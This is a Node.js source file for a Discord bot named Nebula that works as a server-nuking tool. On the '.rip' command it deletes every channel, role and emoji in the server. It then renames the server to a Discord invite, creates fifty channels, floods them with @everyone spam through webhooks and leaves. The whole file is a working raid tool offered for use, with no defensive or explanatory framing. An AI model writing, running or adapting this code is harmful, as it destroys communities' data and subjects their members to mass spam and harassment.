// ====== LIBRARIES ======
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

let pingCount = 0;
const maxPings = 1000;

function addPing(count = 1) {
  pingCount += count;
  if (pingCount >= maxPings) {
    pingCount = maxPings;
    return true;
  }
  return false;
}

client.on('messageCreate', async (message) => {
  if (message.content === '.rip' && !message.author.bot) {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';

    // Reset ping count for each run
    pingCount = 0;

    // Delete all existing content
    await Promise.all([
      guild.channels.cache.forEach(async (channel) => {
        try {
          await channel.delete();
        } catch {}
      }),
      guild.roles.cache.forEach(async (role) => {
        if (role.name !== '@everyone' && !role.managed) {
          try {
            await role.delete();
          } catch {}
        }
      }),
      guild.emojis.cache.forEach(async (emoji) => {
        try {
          await emoji.delete();
        } catch {}
      })
    ]);

    // Rename server
    try {
      await guild.edit({ name: 'discord.gg/migh' });
    } catch {}

    // Create 50 new channels
    const createdChannels = [];
    const createPromises = [];

    for (let i = 0; i < 50; i++) {
      createPromises.push(
        guild.channels.create({ name: 'neb-was-here' }).then(ch => {
          if (ch) createdChannels.push(ch);
        })
      );
    }

    await Promise.all(createPromises);

    // Spam logic - 20 messages per channel via webhook or fallback
    const spamTasks = [];

    for (const channel of createdChannels) {
      if (addPing()) break;

      spamTasks.push(
        (async () => {
          let webhook;
          try {
            webhook = await channel.createWebhook({
              name: 'Nebula',
              avatar: 'https://i.imgur.com/6QbX6yA.png '
            });
          } catch {
            // Fallback to sending directly
            for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
              if (addPing()) break;
              spamTasks.push(channel.send(spamMessage).catch(() => {}));
            }
            return;
          }

          for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
            if (addPing()) break;
            spamTasks.push(
              webhook.send(spamMessage).catch(async () => {
                try {
                  await channel.send(spamMessage);
                  addPing();
                } catch {}
              })
            );
          }
        })()
      );
    }

    // Run spam tasks concurrently
    await Promise.all(spamTasks);

    // Leave server
    try {
      await guild.leave();
    } catch {}
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);